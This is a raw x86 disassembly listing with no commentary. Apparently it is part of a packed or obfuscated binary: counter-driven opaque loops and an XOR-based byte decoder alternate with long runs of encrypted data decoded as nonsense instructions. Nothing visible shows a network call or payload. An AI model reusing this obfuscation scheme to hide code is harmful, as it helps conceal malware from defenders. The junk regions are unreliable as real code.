  4038b8:	outs   dx,BYTE PTR ds:[esi]
  4038b9:	(bad)  
  4038ba:	sti    
  4038bb:	push   0x3e
  4038bd:	arpl   ax,cx
  4038bf:	enter  0xb5e0,0x28
  4038c3:	leave  
  4038c4:	xor    al,0x26
  4038c6:	ja     0x4038a0
  4038c8:	xor    DWORD PTR [esi],esi
  4038ca:	cdq    
  4038cb:	in     eax,0xdf
  4038cd:	test   DWORD PTR [ebx+0x7],eax
  4038d0:	pop    esi
  4038d1:	mov    ch,0xfc
  4038d3:	mov    ch,0x3d
  4038d6:	cmp    BYTE PTR [edx+0x470ba20e],0x41
  4038dd:	loop   0x40394d
  4038df:	mov    ecx,0x7038d7fd
  4038e4:	xor    DWORD PTR [eax+0x4e],edi
  4038e7:	pop    edx
  4038e8:	xor    eax,ecx
  4038ea:	add    eax,edx
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43442d,0x11
  403938:	cmp    DWORD PTR ds:0x43442d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43442d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43437a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432c26
  403960:	mov    eax,ds:0x43442d
  403965:	dec    eax
  403966:	mov    ds:0x43442d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432dca
  403975:	add    DWORD PTR ds:0x432de2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4326f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43441d
  40399d:	sub    DWORD PTR ds:0x4343a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434429
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434396
  4039c1:	xor    ecx,DWORD PTR ds:0x43439a
  4039c7:	mov    DWORD PTR ds:0x434396,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432dbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432dbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432dbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43438a
  4039f9:	push   0x43275d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432c2a
  403a11:	mov    ecx,DWORD PTR ds:0x432dbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432dbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4326f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43437e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432dde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432dde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432dde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432de6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43439e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432c2e
  403a7c:	cmp    DWORD PTR ds:0x432dde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432dde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432dde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432dde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432dde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43439a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434396,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0x2d
  403ae4:	pop    edx
  403ae5:	cmp    BYTE PTR [edx+0x70701eec],al
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403a70
  403af0:	or     eax,0x2a91d608
  403af5:	add    eax,0x8148ded5
  403afa:	pop    edi
  403afb:	enter  0xb584,0x61
  403aff:	mov    ch,0xf0
  403b01:	or     eax,ebp
  403b03:	mov    WORD PTR [ecx-0xf],fs
  403b06:	fnstenv [edi+0x3f6922fb]
  403b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b0d:	inc    eax
  403b0e:	pusha  
  403b0f:	adc    BYTE PTR [edi+0x640e1d4e],ah
  403b15:	scas   al,BYTE PTR es:[edi]
  403b16:	in     al,0x86
  403b18:	push   es
  403b19:	jmp    0x698:0x1f56dc62
  403b20:	mov    bh,0xda
  403b22:	ror    DWORD PTR [edx-0x7],cl
  403b25:	pop    edx
  403b26:	test   al,0x68
  403b28:	push   0xacc6b743
  403b2d:	adc    DWORD PTR [esi+eiz*1],0x9e257c7d
  403b34:	inc    edi
  403b35:	retf   0x8a11
  403b38:	sar    edx,0xc4
  403b3b:	sub    ah,dh
  403b3d:	fmul   QWORD PTR [eax-0x6c083def]
  403b43:	jge    0x403af8
  403b45:	sub    eax,0xe84af376
  403b4a:	jge    0x403bad
  403b4c:	sub    BYTE PTR [esi],ch
  403b4e:	mov    dl,0xb6
  403b50:	xor    bh,cl
  403b52:	outs   dx,BYTE PTR ds:[esi]
  403b53:	xchg   DWORD PTR [edx],esi
  403b55:	jae    0x403b74
  403b57:	out    dx,al
  403b58:	mov    DWORD PTR [eax],edx
  403b5a:	jnp    0x403ba2
  403b5c:	sbb    esi,DWORD PTR [ebx]
  403b5e:	xchg   ecx,eax
  403b5f:	loope  0x403bc3
  403b61:	pop    ecx
  403b62:	jecxz  0x403b8c
  403b64:	aam    0x75
  403b66:	xchg   ecx,eax
  403b67:	and    al,BYTE PTR [edi-0x4fda83c1]
  403b6d:	ss loopne 0x403b18
  403b70:	pop    eax
  403b71:	push   0xefbd8cf0
  403b76:	lock cli 
  403b78:	jbe    0x403b8a
  403b7a:	outs   dx,BYTE PTR ds:[esi]
  403b7b:	dec    edx
  403b7c:	or     DWORD PTR [ecx],edx
  403b7e:	rcl    DWORD PTR [edi+eiz*2+0x8d68757],cl
  403b85:	jmp    0x815e:0x7fb25b05
  403b8c:	retf   0x5d21
  403b8f:	push   es
  403b90:	cmp    BYTE PTR [eax-0x44],0xfc
  403b94:	add    al,0xd8
  403b96:	outs   dx,DWORD PTR ds:[esi]
  403b97:	jmp    0x403c12
  403b99:	dec    eax
  403b9a:	add    eax,0xcdc339b3
  403b9f:	adc    ebx,DWORD PTR [edi]
  403ba1:	pop    edi
  403ba2:	and    DWORD PTR [edi-0x5c56f9b],esi
  403ba8:	icebp  
  403ba9:	mov    esp,DWORD PTR [edx+0x2a4cebbb]
  403baf:	aam    0x67
  403bb1:	rcl    BYTE PTR [ebx-0x4],cl
  403bb4:	mov    eax,ds:0xb98e9790
  403bb9:	cmp    al,0x34
  403bbb:	jns    0x403b41
  403bbd:	jbe    0x403bc2
  403bbf:	cmp    BYTE PTR [eax+ebp*8-0x55819803],cl
  403bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bc7:	mul    ebp
  403bc9:	(bad)  
  403bca:	ds fs out 0x79,al
  403bce:	mov    DWORD PTR [edx-0x7915c07b],eax
  403bd4:	ds js  0x403bca
  403bd7:	xchg   ebp,eax
  403bd8:	repnz pop es
  403bda:	mov    bh,0x69
  403bdc:	pushf  
  403bdd:	cmp    eax,0x6cad9f38
  403be2:	test   dl,dh
  403be4:	rol    BYTE PTR [edi+eiz*2],cl
  403be7:	shl    DWORD PTR [ecx-0x17],cl
  403bea:	inc    edx
  403beb:	jge    0x403bb5
  403bed:	loope  0x403c00
  403bef:	and    bh,al
  403bf1:	xor    al,0x1e
  403bf3:	out    dx,eax
  403bf4:	out    dx,eax
  403bf5:	cmp    BYTE PTR [eax],bl
  403bf7:	add    ecx,edx
  403bf9:	ds mov dh,0x9e
  403bfc:	ret    
  403bfd:	aad    0x7c
  403bff:	lods   al,BYTE PTR ds:[esi]
  403c00:	aam    0x56
  403c02:	mov    ebx,0xbda26106
  403c07:	mov    esp,0x14e47ff
  403c0c:	and    DWORD PTR [ecx-0x7664a870],ebx
  403c12:	mov    cl,0x38
  403c14:	lock stos BYTE PTR es:[edi],al
  403c16:	pushf  
  403c17:	push   esi
  403c18:	inc    esi
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434376,0x434421
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432dd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43436a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	xchg   ecx,eax
  403c62:	inc    edx
  403c63:	or     BYTE PTR [edi+0x70701d94],ah
  403c69:	sbb    BYTE PTR [edi+0x70],bh
  403c6c:	jo     0x403c71
  403c6e:	and    ch,BYTE PTR [edx-0x30878ed]
  403c74:	xchg   ebx,eax
  403c75:	jle    0x403cc7
  403c77:	push   ecx
  403c78:	(bad)
  403c7b:	mov    bl,0xc7
  403c7d:	icebp  
  403c7e:	mov    bl,0xfd
  403c80:	or     esp,DWORD PTR [esi+0x23]
  403c83:	and    edi,DWORD PTR [eax-0x1b]
  403c86:	les    esi,FWORD PTR [ecx+ecx*1]
  403c89:	xor    DWORD PTR ds:0x906a105f,esp
  403c8f:	mov    ch,0x3
  403c91:	sub    BYTE PTR [ecx-0x3e71fe59],cl
  403c97:	pusha  
  403c98:	(bad)  
  403c99:	adc    DWORD PTR [eax],0x64
  403c9c:	enter  0xfcf2,0x8b
  403ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ca1:	and    DWORD PTR [ebx],esp
  403ca3:	mov    ah,0xc5
  403ca5:	dec    eax
  403ca6:	mov    ecx,0x7968ed2a
  403cab:	mov    al,ds:0xffeff065
  403cb0:	mov    ebp,0xa37534f1
  403cb5:	xchg   edx,eax
  403cb6:	(bad)  
  403cb8:	hlt    
  403cb9:	lock jge 0x403c61
  403cbc:	dec    ebp
  403cbd:	lahf   
  403cbe:	and    ebx,ebx
  403cc0:	dec    ecx
  403cc1:	xchg   ecx,eax
  403cc2:	and    DWORD PTR [esi+0x1148c3bf],0x35
  403cc9:	push   ebp
  403cca:	adc    DWORD PTR [esi-0x1cbd7151],edx
  403cd0:	mov    esp,0x2d345381
  403cd5:	aaa    
  403cd6:	pop    esi
  403cd7:	jnp    0x403cbb
  403cd9:	jno    0x403ca1
  403cdb:	fwait
  403cdc:	aad    0x4f
  403cde:	fdiv   QWORD PTR [esi]
  403ce0:	inc    eax
  403ce1:	int3   
  403ce2:	add    edx,esi
  403ce4:	xchg   esp,eax
  403ce5:	icebp  
  403ce6:	xchg   DWORD PTR [esi+0x12c0e669],esp
  403cec:	test   BYTE PTR ds:0x879d8edd,bh
  403cf2:	add    dl,dh
  403cf4:	retf   0xc5c8
  403cf7:	out    dx,eax
  403cf8:	cmp    DWORD PTR [ecx+0x8],eax
  403cfb:	or     DWORD PTR [ecx-0x21],eax
  403cfe:	xchg   ecx,eax
  403cff:	and    ebp,ecx
  403d01:	imul   esi,DWORD PTR ds:[ecx-0x57],0xffffffad
  403d06:	aad    0x94
  403d08:	mov    al,ds:0x55770895
  403d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d0e:	js     0x403cc5
  403d10:	adc    edx,DWORD PTR [edx+0x4c]
  403d13:	add    dl,BYTE PTR [ebx+0x39]
  403d16:	aam    0x6c
  403d18:	jmp    0x17c4cba6
  403d1d:	scas   eax,DWORD PTR es:[edi]
  403d1e:	or     al,0x1c
  403d20:	(bad)  
  403d21:	push   0xe1024d88
  403d26:	and    bh,BYTE PTR ds:0x36562089
  403d2c:	test   al,0x9f
  403d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d30:	ror    dh,1
  403d32:	ja     0x403cb5
  403d34:	fld    TBYTE PTR [ecx]
  403d36:	xchg   ecx,eax
  403d37:	ret    0x7d3d
  403d3a:	(bad)  
  403d3b:	fdiv   st,st(0)
  403d3d:	xor    al,0xac
  403d3f:	in     al,dx
  403d40:	stos   BYTE PTR es:[edi],al
  403d41:	rcl    BYTE PTR [esi+0x2cd9f02b],0x21
  403d48:	fcom   QWORD PTR [eax]
  403d4a:	aad    0xbb
  403d4c:	loopne 0x403da8
  403d4e:	fsubr  DWORD PTR [ebx]
  403d50:	fstp   DWORD PTR ds:0x137f5194
  403d56:	ret    0xc54d
  403d59:	aad    0xf4
  403d5b:	push   ebp
  403d5c:	adc    al,0xac
  403d5e:	call   0x302b081a
  403d63:	pop    edx
  403d64:	fisttp QWORD PTR [edx-0x41]
  403d67:	stos   BYTE PTR es:[edi],al
  403d68:	inc    esp
  403d69:	adc    BYTE PTR [edi],ch
  403d6b:	ins    DWORD PTR es:[edi],dx
  403d6c:	stos   BYTE PTR es:[edi],al
  403d6d:	cmp    dl,dl
  403d6f:	mov    ds:0xf69e3ea8,al
  403d74:	in     eax,0xbb
  403d76:	push   cs
  403d77:	or     eax,0xedc5439a
  403d7c:	push   0x1c
  403d7e:	idiv   DWORD PTR [esi]
  403d80:	dec    sp
  403d82:	cmp    DWORD PTR ds:0x4d0655f4,edi
  403d88:	mov    ecx,esp
  403d8a:	scas   al,BYTE PTR es:[edi]
  403d8b:	sub    dl,BYTE PTR [ecx-0x45]
  403d8e:	fiadd  DWORD PTR [ebp+0x75]
  403d91:	cmp    dh,bl
  403d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d94:	sub    eax,0xfea0820f
  403d99:	(bad)  
  403d9a:	dec    DWORD PTR [ebx+0x2581f855]
  403da0:	call   0x0:0x4343
  403da7:	add    cl,ch
  403da9:	push   cs
  403daa:	add    BYTE PTR [eax],al
  403dac:	add    BYTE PTR [ebx],dh
  403dae:	rol    BYTE PTR [ebx],0x5
  403db1:	call   0x9aa3:0x40004343
  403db8:	inc    ebx
  403db9:	inc    ebx
  403dba:	add    BYTE PTR [ebx+0x43439a3d],al
  403dc0:	add    BYTE PTR [ebx],dl
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43439a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4329be
  403dde:	cmp    DWORD PTR ds:0x43439a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43439a
  403df3:	inc    eax
  403df4:	mov    ds:0x43439a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	int    0xf4
  403e1a:	pop    edi
  403e1b:	sar    DWORD PTR [esp+ebx*1+0x7f187070],cl
  403e22:	jo     0x403e94
  403e24:	sbb    al,0xa8
  403e26:	int3   
  403e27:	std    
  403e28:	std    
  403e29:	stos   BYTE PTR es:[edi],al
  403e2a:	shr    BYTE PTR [ecx],0x6c
  403e2d:	loope  0x403e04
  403e2f:	popf   
  403e30:	cmp    eax,DWORD PTR [eax+0x4]
  403e33:	push   ss
  403e34:	test   al,0x84
  403e36:	dec    esi
  403e37:	sahf   
  403e38:	in     eax,dx
  403e39:	cs in  al,0x13
  403e3c:	inc    eax
  403e3d:	imul   ebp,DWORD PTR [edx-0x68],0x28
  403e41:	pop    esi
  403e42:	cmp    al,0x6d
  403e44:	inc    ebp
  403e45:	adc    al,0x9e
  403e47:	jle    0x403e65
  403e49:	add    cl,dh
  403e4b:	in     al,0x8c
  403e4d:	jns    0x403df7
  403e4f:	jnp    0x403e0f
  403e51:	rcl    DWORD PTR [ebx],0xb1
  403e54:	add    cl,BYTE PTR [edi+0x39]
  403e57:	(bad)  
  403e58:	shl    BYTE PTR [edx],1
  403e5a:	jecxz  0x403e08
  403e5c:	imul   ecx,DWORD PTR [ebx],0xe20916d2
  403e62:	daa    
  403e63:	sub    DWORD PTR [edi],esp
  403e65:	xchg   esp,eax
  403e66:	mov    ecx,DWORD PTR [edx+edx*8-0x59]
  403e6a:	mov    ebp,0x5874994b
  403e6f:	lock fisub DWORD PTR [ebx+0x76]
  403e73:	mov    esp,0xdd274b32
  403e78:	jle    0x403ef8
  403e7a:	outs   dx,BYTE PTR ds:[esi]
  403e7b:	cli    
  403e7c:	data16 (bad) 
  403e7e:	fwait
  403e7f:	mov    al,0x1e
  403e81:	idiv   BYTE PTR [edx]
  403e83:	repz pop ds
  403e85:	sub    bh,BYTE PTR [esi+0x1f7c3581]
  403e8b:	rol    DWORD PTR [ebx],1
  403e8d:	pop    cx
  403e8f:	sub    eax,0x406d342
  403e94:	out    0x6d,eax
  403e96:	jecxz  0x403e77
  403e98:	xor    al,BYTE PTR [esi-0x75]
  403e9b:	jge    0x403e1e
  403e9d:	mov    edx,0xd86c8748
  403ea2:	sbb    edx,0x4c
  403ea5:	xor    eax,0x7e01c51
  403eaa:	in     al,dx
  403eab:	aaa    
  403eac:	xchg   ebx,eax
  403ead:	test   BYTE PTR [eax+ecx*2],dl
  403eb0:	xchg   DWORD PTR ds:0xbb85dc90,esi
  403eb6:	adc    al,0xbb
  403eb8:	pop    edi
  403eb9:	sub    eax,0x7fb3a8e9
  403ebe:	mov    BYTE PTR [edi+0x632b40cb],0xff
  403ec5:	adc    al,0x45
  403ec7:	push   ecx
  403ec8:	jp     0x403ee2
  403eca:	popa   
  403ecb:	push   0xf96753f3
  403ed0:	pop    ebp
  403ed1:	or     eax,0xabe4ded1
  403ed6:	repnz add BYTE PTR ds:[ebx-0x4b],ah
  403edb:	out    0x11,eax
  403edd:	ficom  WORD PTR [eax]
  403edf:	or     ecx,ecx
  403ee1:	pushf  
  403ee2:	push   ebp
  403ee3:	div    DWORD PTR [edi-0x48]
  403ee6:	pusha  
  403ee7:	sbb    al,0x91
  403ee9:	pop    eax
  403eea:	xchg   ebx,eax
  403eeb:	xchg   dh,al
  403eed:	adc    bl,bh
  403eef:	mov    ds:0xf47d89b2,al
  403ef4:	adc    cl,bl
  403ef6:	xchg   esp,eax
  403ef7:	ds pop es
  403ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403efa:	rcl    BYTE PTR [esi],1
  403efc:	mov    al,ds:0x82b5bdb7
  403f01:	or     ebp,DWORD PTR [edx]
  403f03:	in     al,dx
  403f04:	sti    
  403f05:	sbb    bl,BYTE PTR [ebp-0x45]
  403f08:	and    al,0x5e
  403f0b:	icebp  
  403f0c:	pop    ebp
  403f0d:	mov    ch,BYTE PTR [esi+eiz*8-0x2]
  403f11:	lods   eax,DWORD PTR ds:[esi]
  403f12:	loop   0x403efd
  403f14:	push   eax
  403f15:	mov    al,0x78
  403f17:	pushf  
  403f18:	(bad)  
  403f19:	fwait
  403f1a:	addr16 (bad) 
  403f1c:	sti    
  403f1d:	daa    
  403f1e:	(bad)  
  403f1f:	adc    al,0xd
  403f21:	loopne 0x403ed8
  403f23:	jb     0x403f4c
  403f25:	(bad)  
  403f26:	lods   al,BYTE PTR ds:[esi]
  403f27:	loopne 0x403ee4
  403f29:	shr    DWORD PTR [edi+0x3801531d],1
  403f2f:	jp     0x403f27
  403f31:	add    eax,0x76df3059
  403f36:	pop    edx
  403f37:	sub    edx,DWORD PTR [edx-0x33]
  403f3a:	cmp    DWORD PTR [edx+eiz*2+0x649da411],ebx
  403f41:	mov    BYTE PTR [ebx+eax*2-0x56a3fc41],dl
  403f48:	cmp    eax,0xf3219f4
  403f4d:	test   BYTE PTR [ebp+0x53000001],al
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	ja     0x403f89
  403fa4:	push   ebp
  403fa5:	out    0x64,al
  403fa7:	sbb    esi,DWORD PTR [eax+0x70]
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x404001
  403faf:	mov    edx,0xe7a9ec93
  403fb4:	push   eax
  403fb5:	stos   BYTE PTR es:[edi],al
  403fb6:	mov    bh,0x2
  403fb8:	sbb    DWORD PTR [eax+0x2461f12f],0x90058a12
  403fc2:	sub    dh,bh
  403fc4:	fcomp  st(6)
  403fc6:	in     eax,dx
  403fc7:	add    bl,0x1e
  403fca:	xchg   edx,eax
  403fcb:	outs   dx,BYTE PTR ds:[esi]
  403fcc:	push   ebp
  403fcd:	mov    esp,0x95973399
  403fd2:	call   0xb81c55dc
  403fd7:	(bad)  
  403fd8:	shl    DWORD PTR [ebp+0x23709d56],1
  403fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fdf:	imul   ebp,DWORD PTR [ecx-0x5845a2bb],0x5f
  403fe6:	mov    cl,0xf9
  403fe9:	lock sbb BYTE PTR [esi],0x6e
  403fed:	or     esp,eax
  403fef:	push   eax
  403ff0:	fnstenv [esi*8+0x4beacf44]
  403ff7:	pop    edi
  403ff8:	call   0xaa9d:0x38f74098
  403fff:	enter  0x17c3,0x7a
  404003:	xor    dl,dh
  404005:	jl     0x404077
  404007:	add    ch,BYTE PTR [edi-0x1a]
  40400a:	mov    eax,0x971c631c
  40400f:	aaa    
  404010:	xor    DWORD PTR [ebp+edx*4-0x13d4f383],edx
  404017:	pop    esi
  404018:	lahf   
  404019:	cld    
  40401a:	add    dh,BYTE PTR ds:0x14032127
  404020:	jnp    0x404062
  404022:	xor    edx,DWORD PTR [ebp+0x2e3294fc]
  404028:	xchg   edi,eax
  404029:	xchg   BYTE PTR [edx+0x7d],dh
  40402c:	sub    al,ah
  40402e:	outs   dx,BYTE PTR ds:[esi]
  40402f:	int    0x9f
  404031:	add    eax,0xcbaa4480
  404036:	mov    al,ds:0x3b700dc4
  40403b:	or     cl,BYTE PTR [edx-0x73]
  40403e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40403f:	add    eax,0xe91340dc
  404044:	retf   0x5f63
  404047:	idiv   edi
  404049:	stc    
  40404a:	push   eax
  40404b:	push   esi
  40404c:	outs   dx,BYTE PTR ds:[esi]
  40404d:	cs jb  0x404024
  404050:	in     eax,dx
  404051:	imul   ebx,DWORD PTR [edx+0x33],0x16
  404055:	stos   DWORD PTR es:[edi],eax
  404056:	je     0x40401f
  404058:	cmp    eax,esp
  40405a:	sti    
  40405b:	adc    eax,0x6537fef6
  404060:	lods   eax,DWORD PTR ds:[esi]
  404061:	in     eax,dx
  404062:	mov    ch,BYTE PTR [ebx-0x4c67a27]
  404068:	imul   ecx,edx,0xffffff86
  40406b:	push   eax
  40406c:	arpl   WORD PTR [esi+esi*4-0x72],cx
  404070:	or     ch,BYTE PTR [edi+0x2abd4657]
  404076:	cmp    DWORD PTR [ecx+0x7ffd6896],esp
  40407c:	adc    BYTE PTR [ebp+0x60],al
  40407f:	adc    esi,DWORD PTR ds:0x8c473eda
  404085:	sbb    al,0xa0
  404087:	test   BYTE PTR [esi-0x68],bl
  40408a:	jb     0x4040a7
  40408c:	fs pop es
  40408e:	repz ja 0x404048
  404091:	sbb    esi,DWORD PTR [edx]
  404093:	inc    esp
  404094:	pop    esp
  404095:	inc    ecx
  404096:	jne    0x4040c8
  404098:	or     eax,0x904d1fdd
  40409d:	and    al,0xd6
  40409f:	gs pop edx
  4040a1:	or     DWORD PTR [ecx+0x1b830a1b],ebx
  4040a7:	add    eax,0x9305baf1
  4040ac:	dec    ebx
  4040ad:	jo     0x4040f0
  4040af:	mov    edx,0x81059230
  4040b4:	out    0x54,eax
  4040b6:	push   ds
  4040b7:	test   DWORD PTR [edi],edx
  4040b9:	fwait
  4040ba:	jns    0x404063
  4040bc:	adc    al,0x2f
  4040be:	mov    cl,0xe8
  4040c0:	gs mov ebx,0x6e30d8a1
  4040c6:	push   ds
  4040c7:	cld    
  4040c8:	or     edx,DWORD PTR ds:0x7b2169b0
  4040ce:	dec    ecx
  4040cf:	xor    BYTE PTR [edi+0x547fd06d],al
  4040d5:	std    
  4040d6:	pop    ebx
  4040d7:	mov    eax,DWORD PTR [ebp-0x8]
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx-0x14bad1f8],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x40409d
  4040fb:	sub    BYTE PTR [ebx-0x26],al
  4040fe:	ja     0x4040d5
  404100:	fild   DWORD PTR [eax+0x46]
  404103:	sub    eax,0x11b69a0d
  404108:	push   edi
  404109:	dec    ebp
  40410a:	sub    al,0x77
  40410c:	adc    al,0x8e
  40410e:	popa   
  40410f:	sbb    DWORD PTR [ebx+0x6a],ebp
  404112:	sti    
  404113:	mov    esi,0xe3c74db1
  404118:	mov    edi,0xd6cdab7b
  40411d:	out    dx,eax
  40411e:	scas   eax,DWORD PTR es:[edi]
  40411f:	push   ds
  404120:	mov    edi,0xeaefa38e
  404125:	icebp  
  404126:	xchg   ecx,eax
  404127:	sbb    ah,BYTE PTR [edi]
  404129:	bound  ebp,QWORD PTR [ebp-0x42]
  40412c:	sti    
  40412d:	push   ebx
  40412e:	jae    0x4040bb
  404130:	test   BYTE PTR [ecx+0x13d0753b],0x93
  404137:	(bad)  
  404138:	(bad)  
  404139:	lock mov eax,ds:0x4c08f9e6
  40413f:	ins    BYTE PTR es:[edi],dx
  404140:	aas    
  404141:	not    DWORD PTR [edi-0x77]
  404144:	push   0x36
  404146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404147:	fldenv [esi-0x3a]
  40414a:	add    dl,BYTE PTR [ebp+ebx*4+0x2f635fa6]
  404151:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404153:	(bad)  
  404154:	fs pop edx
  404156:	(bad)  
  404157:	pop    ecx
  404158:	jge    0x404157
